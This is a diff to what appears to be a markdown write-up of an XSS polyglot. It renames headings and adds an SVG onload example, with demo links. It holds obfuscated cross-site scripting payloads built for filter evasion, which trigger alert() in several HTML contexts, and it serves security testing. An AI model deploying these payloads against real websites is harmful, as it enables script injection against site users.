@@ -53,14 +53,14 @@ _Demo: <https://jsbin.com/diwedo>_
 
 ```
 _Demo: <https://jsbin.com/zizuvad>_
-* __HTML-escaped unquoted tag attributes (may require a click):__
+* __Unquoted tag attributes with HTML-escaped values (may require a click):__
 ```html
 
 <img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>
 
 ```
 _Demo: <https://jsbin.com/gopavuz>_
-* __HTML-escaped "href"/"xlink:href" and "src" attribute values:__
+* __`href`/`xlink:href` and `src` attributes with HTML-escaped values:__
 ```html
 <a href="
 
@@ -175,7 +175,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 </script>
 ```
 _Demo: <https://jsbin.com/vovogo>_
-
 ##### _JS sinks_:
 * __`eval`:__
 ````javascript
@@ -234,7 +233,15 @@ document.close();
 
 ```
 _Demo: <https://jsbin.com/ruhofi>_
+* __Event handlers with HTML-escaped values:__
+```html
+<svg onload="
 
+void 'javascript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e';
+
+"></svg>
+```
+_Demo: <https://jsbin.com/kazoniwugo>_
 ## Filter evasion:
 As you might have already noticed, the polyglot has been crafted with filter evasion in mind. For instance:
 
